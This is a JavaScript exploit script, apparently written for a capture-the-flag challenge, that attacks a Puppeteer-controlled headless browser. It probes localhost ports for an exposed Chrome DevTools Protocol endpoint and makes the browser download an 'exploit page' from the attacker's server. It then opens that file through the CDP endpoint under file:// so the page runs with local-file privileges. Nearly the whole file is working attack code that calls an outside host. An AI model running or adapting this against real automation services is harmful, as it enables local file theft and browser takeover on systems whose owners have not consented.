// Extracting query parameters from the URL
const urlSearchParams = new URLSearchParams(window.location.search);
const startPort = parseInt(urlSearchParams.get('startPort')) || 9222;
const retrievePort = urlSearchParams.get('retrievePort') || 'true';

// Extracting the hostname from the script's URL
const scriptUrl = document.currentScript.src;
const myServer = new URL(scriptUrl).hostname;

// Synchronous XMLHttpRequest function for simple fetching
function fetchSync(url, method = 'GET', body = null) {
  const request = new XMLHttpRequest();
  request.open(method, url, false); // Synchronous request
  request.send(body);
  return request.status;
}

// Function to discover an open port for the Puppeteer instance
function getPort(startPort) {
  for (let port = startPort; port > 0; port--) {
    try {
      let status = fetchSync(`http://localhost:${port}/json`);
      if (status === 200) {
        return port;
      }
    } catch {
      // Ignore errors for simplicity in this example
      continue;
    }
  }
}

// Main exploit function
function exploit() {
  // Make exploit file name unique to avoid conflicts
  const exploitFileNameWithUUID = `fetcher_${crypto.randomUUID()}.html`; 
  const port = getPort(startPort);
  const url = `https://${myServer}/${exploitFileNameWithUUID}`;

  // Trigger the automatic download of the exploit page
  // The filename should be non-existent in the download folder
  window.open(url); 

  // Wait for the browser to download the file
  // Sleep for 2 seconds using a server request
  fetchSync(`https://${myServer}/sleep?duration=2`);

  // Specify the file path using the file:// protocol
  const file = `file:///home/challenge/Downloads/${exploitFileNameWithUUID}?myServer=${myServer}`;
 
  // Open the exploit page through the CDP endpoint to run the exploit
  fetchSync(`http://localhost:${port}/json/new?${file}`, 'PUT');
}

// Execute the main exploit function
if (retrievePort == 'true') {
  exploit();
}

// To keep the browser open, reload without retrieving the port again
window.location.search = '?retrievePort=false';
